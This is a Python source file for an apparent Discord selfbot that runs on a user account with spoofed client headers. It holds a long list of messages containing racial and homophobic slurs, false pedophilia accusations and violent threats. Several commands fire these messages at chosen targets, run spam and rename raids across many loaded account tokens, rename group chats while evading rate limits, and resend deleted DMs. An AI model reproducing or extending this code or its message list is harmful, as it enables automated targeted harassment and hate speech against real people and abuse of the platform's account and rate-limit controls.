        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "brave": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Brave";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQnJhdmUiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "edge": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Microsoft Edge";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiTWljcm9zb2Z0IEVkZ2UiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzEyMi4wLjAuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "safari": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },


    "ipad": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJTYWZhcmkiLCJkZXZpY2UiOiJpUGFkIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKGlQYWQ7IENQVSBPUyAxNl81IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTYuNSIsIm9zX3ZlcnNpb24iOiIxNi41IiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "android": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Discord-Android/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImNsaWVudF92ZXJzaW9uIjoiMTI2LjIxIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiZGV2aWNlX3ZlbmRvcl9pZCI6Ijg4OGJhMTYwLWEwMjAtNDNiYS05N2FmLTYzNTFlNjE5ZjA0MSIsImJyb3dzZXJfdXNlcl9hZ2VudCI6IiIsImJyb3dzZXJfdmVyc2lvbiI6IiIsIm9zX3ZlcnNpb24iOiIzMSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "ios": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Discord-iOS/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZSAxNCBQcm8iLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJjbGllbnRfdmVyc2lvbiI6IjEyNi4yMSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImRldmljZV92ZW5kb3JfaWQiOiI5OTkxMTgyNC01NjczLTQxNDQtYTU3NS0xMjM0NTY3ODkwMTIiLCJicm93c2VyX3VzZXJfYWdlbnQiOiIiLCJicm93c2VyX3ZlcnNpb24iOiIiLCJvc192ZXJzaW9uIjoiMTYuNSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
}



ANTI_AFK_RESPONSES = [
    "?",
    "sup",
    "beg me to say it ",
    "uh what?",
    "shut the fuck up nigga",
    "what?"
    "hi",
    "????",
    "sup cuh",
    "wyw gng?",
    "nope kid lol im here",
    "yep ur fucking ass failed afk check im here",
        

]


active_users = {}
last_message_time = {}
spam_timeout = 3

messages = [
    "yo {name} pedo shut the fuck up",
    "{name} the useless slut",
    "yo goat fucker",
    "you love my feces {name}",
    "sup goat rapist",
    "yo rooster fucker",
    "{name} the pedophile",
    "why are you so ugly {name}",
    "cry some more bitch",
    "eggplant",
    "goat anus sniffer",
    "yo {name} take that popsicle out your ass hole",
    "insecure bitch",
    "yo pedophile {name}",
    "{name} the aborted fetus",
    "trash geeky bitch",
    "stop\npraying\nto\nme\n{name}\nur\nmy\nfucking\nbitch",
    "pitbull fucker",
    "shut your fucking lips {name}",
    "you're dog shit",
    "hey {name} stop crying pedophile",
    "your so shitty",
    "semen licking blood worm",
    "ugly ass nigga named {name}",
    "yo {name} don't you fuck dogs",
    "jstop\nkissing\nmy\nass\nfaggot",
    "yo\n{name}\nis\nthis\nthe\nway\nhow\nyou\ncope",
    "nobody cares pedophile",
    "shut up",
    "rooster neck",
    "pussy ass bitch",
    "nigga\nyour\nname\nis\n{name}\nstop\ntalking",
    "fuck up {name}",
    "bitch your dog shit",
    "bro {name} didn't i tell you to shut up bitch",
    "yo nigga {name} i will break your jaw in half",
    "stinky diaper wearing sea urchant",
    "baby fucker lol",
    "pigeon rapist named {name}",
    "you smell like ass pussy",
    "pencil neck racoon",
    "take that stop sign out your nose",
    "yo\nshut\nup\nshitskin\nloser",
    "spineless pedophile",
    "yo {name} don't you fuck roosters",
    "shut up goat fucker",
    "yo\n{name}\nill\nfucking\nbitch you",
    "come pack then {name}",
    "yo goblin",
    "{name} the kid fucker",
    "british screwdriver",
    "end it all pussy",
    "animal rapist",
    "fuck nigga",
    "get a gym membership fat bitch",
    "zoophile",
    "you're terrified of me bitch",
    "wipe them tears pussy",
    "stop talking {name}",
    "I will beat the shit out of you",
    "you some hot ass",
    "sup kid fucker",
    "bro {name} didn't i tell you to quiet it down bitch",
    "you're not wanted here bitch",
    "sup pedophile how you been",   
    "yo slut you suck {name}", 
    "LMFAO LETS BEEF ALL DAY",
    "YO JR PICK THEM GLOVES UP LETS GO AGAIN",
    "lets beef forever",
    "getting bullied to an outsider lead you to get hoed by me",
    "aint shit a dream loser",
    "YO PEDO WAKE UP IM RIGHT HERE",
    "ILL BASH YOUR SKULL IN AND RIP OFF YOUR SKIN",
    "ILL TAKE YOUR HEAD AS MY TROPHY LOL",
    "yo deformed toilet paper come whipe my ass",
    "zip\nthat\nfucking\nlip\nfor\ni\npunch\nit\nin",
    "TIRED ALREADY LMFAO",
    "why u begging my goat for nudes",
    "go shave ur pussy wtf",
    "shut up anus sniffer",
    "yo slut come drink my sweat",
    "yo stop licking goat anus"
    
]

def generate_unique_reply(name):
    return random.choice(messages).format(name=name)

@bot.command()
async def godar(ctx, user: discord.User, *, name: str):
    active_users[user.id] = name
    await ctx.message.delete()

@bot.command()
async def stopgodar(ctx, user: discord.User):
    active_users.pop(user.id, None)
    await ctx.message.delete()



active_checks = {}  
afk_check_enabled = False  



@bot.command()
async def godafk(ctx):
    global afk_check_enabled
    afk_check_enabled = not afk_check_enabled
    status = "enabled" if afk_check_enabled else "disabled"
    await ctx.send(f"```ansi\n{ansi_color}\nAnti afk check is now {status}.\n{ansi_reset}")
    

auto_responses = {}

message_counters = defaultdict(int)






@bot.command()
async def arp(ctx, user_id: int, *, response: str):
    auto_responses[user_id] = response.split(', ')
    await ctx.send(f"Auto-response set for <@{user_id}>")

@bot.command()
async def arpe(ctx, user_id: int):
    if user_id in auto_responses:
        del auto_responses[user_id]
        await ctx.send(f"Auto-response removed for <@{user_id}>")
    else:
        await ctx.send(f"No auto-response set for <@{user_id}>")
        
import discord
import asyncio
import random
import time
from discord.ext import commands

# Constants
RATE_LIMIT_COOLDOWN = 60
MAX_RETRIES = 10
INITIAL_BACKOFF = 1
MAX_BACKOFF = 60
MIN_DURATION = 1
MAX_DURATION = 2

# Load tokens from file
def load_tokens(file_path):
    try:
        with open(file_path, 'r') as tokens_file:
            return [token.strip() for token in tokens_file.read().splitlines() if token.strip()]
    except FileNotFoundError:
        raise RuntimeError("Token file not found. Please ensure 'tokens.txt' exists.")
    except Exception as e:
        raise RuntimeError(f"Error loading tokens: {e}")

# Load tokens from the specified file
tokens = load_tokens('tokens.txt')
YOUR_USER_ID = 1243890947226472523  # Replace with your Discord user ID



groupchat_name = ""
toggle_groupchat = False
channel_id = None
count = 0
last_update_time = 0



@bot.command(name="outlastgc")
async def outlastgc(ctx, *, name: str = ""): 
    global groupchat_name, toggle_groupchat, channel_id
    if ctx.author.id == YOUR_USER_ID:
        groupchat_name = name
        channel_id = ctx.channel.id
        toggle_groupchat = True
        bot.loop.create_task(update_channel_name(ctx))
        await ctx.send("```ini\nStarted group chat name updates with base name: {name}")
    else:
        await ctx.send("You do not have permission to use this command.")

@bot.command(name="stopoutlastgc")
async def stopoutlastgc(ctx):
    global toggle_groupchat
    if ctx.author.id == YOUR_USER_ID:
        toggle_groupchat = False
        await ctx.send("Stopped group chat name updates.")

async def update_channel_name(ctx):
    global last_update_time, count
    try:
        while toggle_groupchat:
            current_time = time.time()
            if current_time - last_update_time >= 1:
                if await and_maybe_change_name(ctx):
                    count += 1
                    last_update_time = current_time
                else:
                    await asyncio.sleep(random.uniform(1, 2))
            else:
                await asyncio.sleep(1)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"Unexpected error in update_channel_name: {e}")

async def and_maybe_change_name(ctx):
    try:
        change_interval = random.uniform(MIN_DURATION, MAX_DURATION)
        await asyncio.sleep(change_interval)
        return await change_name_for_client(ctx)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"Error in and_maybe_change_name: {e}")
        return False

async def change_name_for_client(ctx):
    global count
    backoff = INITIAL_BACKOFF
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            channel = bot.get_channel(channel_id)
            if channel:
                await channel.edit(name=f'{groupchat_name} {count}')
                return True
            await asyncio.sleep(random.uniform(1, 3))
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = getattr(e, 'retry_after', RATE_LIMIT_COOLDOWN)
                await asyncio.sleep(retry_after)
            else:
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, MAX_BACKOFF)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, MAX_BACKOFF)
    return False

async def keep_alive():
    while True:
        try:
            await asyncio.sleep(3600)
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(5)


godcar_targets = {}
skip_chance = 0.5  # 50% chance to skip messages

@bot.command()
async def godcar(ctx, user: discord.User, *, sentences: str):
    sentences_list = [s.replace('\\n', '\n').strip() for s in sentences.split(',')]
    godcar_targets[user.id] = {"sentences": sentences_list, "message_count": 0}
    await ctx.message.delete()

@bot.command()
async def stopgodcar(ctx, user: discord.User):
    if user.id in godcar_targets:
        del godcar_targets[user.id]
    await ctx.message.delete()

# Dictionary to store closed DM settings per user
closedm_enabled = {}


@bot.command()
async def closedm(ctx):
    """Toggle auto-closing of DMs on or off."""
    user_id = ctx.author.id
    if user_id in closedm_enabled and closedm_enabled[user_id]:
        closedm_enabled[user_id] = False
        await ctx.send("Auto DM closing **disabled**.")
    else:
        closedm_enabled[user_id] = True
        await ctx.send("Auto DM closing **enabled**.")


try:
    bot.load_extension('dm_commands')
    print(f"{Fore.GREEN}[SUCCESS]Dm Commands Cog Loaded Successfully")
except Exception as e:
    print (f"{Fore.RED}[FAILED/ERROR]Failed/Got Error to load the Dm Commands Cog: {str(e)}")

APP_ID = "1352003425272856647"

import os
import time
import aiohttp
import asyncio
import discord
import threading

from io              import BytesIO
from PIL             import Image
from colorama        import Fore
from datetime        import datetime
from discord.ext     import commands
from pypresence      import AioPresence

from requestcord     import *

logs = []
client = {}
rpc = None
rpc_task = None
rpc_active = False
status_rotations = {}
client_ready = asyncio.Event()


    
class RPCManager:
    def __init__(self):
        self.client = None
        self.active = False
        self.update_task = None
        self.custom_image = None

    async def start(self):
        if self.active:
            return
            
        self.client = AioPresence(APP_ID)
        try:
            await self.client.connect()
            self.active = True
            self.update_task = asyncio.create_task(self._presence_loop())
        except Exception as e:
            await self.stop()
            raise e
        
    async def stop(self):
        self.active = False
        if self.update_task:
            self.update_task.cancel()
            try:
                await self.update_task
            except asyncio.CancelledError:
                pass
        
        if self.client:
            try:
                await self.client.close()
            except Exception as e:
                pass
        
        self.custom_image = None
        self.client = None

    async def _update_presence(self):
        if not self.active:
            return
 
        base_data = {
            "state": "escape..",
            "details": "#QC",
            "large_text": "escape..",
            "buttons": [{"label": "/passed", "url": "https://discord.gg/passed"},
                        {"label": "guns.lol/uzz", "url": "https://guns.lol/uzz"}]
        }


        if self.custom_image:
            base_data.update({
                "large_image": self.custom_image
            })
        else:
            base_data.update({
                "large_image": "https://imgur.com/MfPiNCk.gif"
            })

        await self.client.update(**base_data)

    async def _presence_loop(self):
        while self.active:
            try:
                await self._update_presence()
                for _ in range(30):
                    if not self.active:
                        return
                    await asyncio.sleep(1)
            except asyncio.CancelledError:
                break
            except Exception as e:
                log_action(f"Presence loop error: {e}")
                break

    async def set_image(self, url):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, allow_redirects=True, timeout=10) as resp:
                if resp.status != 200:
                    log_action(f"Server responded with status {resp.status}")

                data = await resp.read()

                with Image.open(BytesIO(data)) as img:
                    if img.format not in ['PNG', 'JPEG', 'GIF']:
                        log_action("Only PNG/JPEG/GIF formats supported")

        self.custom_image = url
        await self._update_presence()
rpcm = RPCManager()

    
@bot.command()
async def rpc(ctx, action: str, url: str = None):
        """Coded by kamo all credits to him"""
        """Control Rich Presence
        rpc on - Start presence
        rpc off - Stop presence
        rpc img <url> - Set custom image (512x512)
        """
        try:
            if action == "on":
                await rpcm.start()
                await ctx.send("```ini\n[RPC Activated]```")
                
            elif action == "off":
                await rpcm.stop()
                await ctx.send("```ini\n[RPC Deactivated]```")
                
            elif action == "img":
                if not rpcm.active:
                    raise ValueError("Start RPC first with >rpc on")
                
                await rpcm.set_image(url)
                await ctx.send(f"```ini\n[Image Updated]\nURL = {url}```")
                
        except Exception as e:
            await ctx.send(f"```diff\n- Error: {str(e)}```")
            log_action(f"RPC Error: {str(e)}")
            




import discord
from discord.ext import commands



intents = discord.Intents.default()
intents.messages = True
intents.dm_messages = True 



ignore_dms = False  


@bot.command()
async def airdms(ctx):
    global ignore_dms
    ignore_dms = not ignore_dms  # Toggle the state
    status = "enabled" if ignore_dms else "disabled"
    await ctx.send(f"DM ignoring is now **{status}** :white_check_mark:")
    print(f"DM ignoring {status} by {ctx.author}")


@bot.command()
async def god2(ctx, user_id: int, channel_id: int, name: str, delay: float = 3.0):
    


    if channel_id in running_tasks:
        await ctx.send(f"Spamming is already active in <#{channel_id}>!")
        return

    await ctx.send(f"**GOD CLIENT SPAM & RENAMING STARTED IN <#{channel_id}>...**")

    tasks = []
    for token in TOKENS:
        client = GODCLIENT(token, delay, channel_id, user_id, name, intents=discord.Intents.default())
        task = asyncio.create_task(client.start(token, bot=False))  # Store the task
        client.task = task  # Link the task to the client

        tasks.append(client)  # Store client object

    running_tasks[channel_id] = tasks



@bot.command()
async def god2e(ctx, channel_id: int = None):
   
    if channel_id:
        if channel_id in running_tasks:
            for client in running_tasks[channel_id]:  
                if isinstance(client, GODCLIENT):
                    await client.stop()  

            del running_tasks[channel_id]  # Remove from tracking
            await ctx.send(f"**Stopped GOD client for <#{channel_id}>**")
        else:
            await ctx.send(f"No active tasks found for <#{channel_id}>")

    else:
        for key in list(running_tasks.keys()):
            for client in running_tasks[key]:
                if isinstance(client, GODCLIENT):
                    await client.stop()  

            del running_tasks[key]

        await ctx.send("**ALL GOD CLIENTS TERMINATED.**")




@bot.command()
async def snipe2(ctx, mode: str):
    if mode.lower() == "on":
        sniper_enabled[ctx.author.id] = True
        await ctx.send(":0blackxwhiteflash~2: \n Snipe Enabled! Now tracking deleted messages.")
    elif mode.lower() == "off":
        sniper_enabled[ctx.author.id] = False
        await ctx.send(":0blackxwhiteflash~2: \n Snipe Disabled! Stopped tracking deleted messages.")
    else:
        await ctx.send(":0blackxwhiteflash~2: Invalid Input\nUse snipe2 on or snipe2 off.")

@bot.event
async def on_message_delete(message):
    if isinstance(message.channel, discord.DMChannel):
        if message.author == bot.user:
            return

        if message.author.id in sniper_enabled and sniper_enabled[message.author.id]:
            snipe_text = (
                f":0blackxwhiteflash~2: Deleted Message Detected\n"
                f":0blackxwhiteflash~2: Author: {message.author}\n"
                f":0blackxwhiteflash~2: Message: {message.content}"
            )
            await message.channel.send(snipe_text)





bot.run (usertoken, bot=False)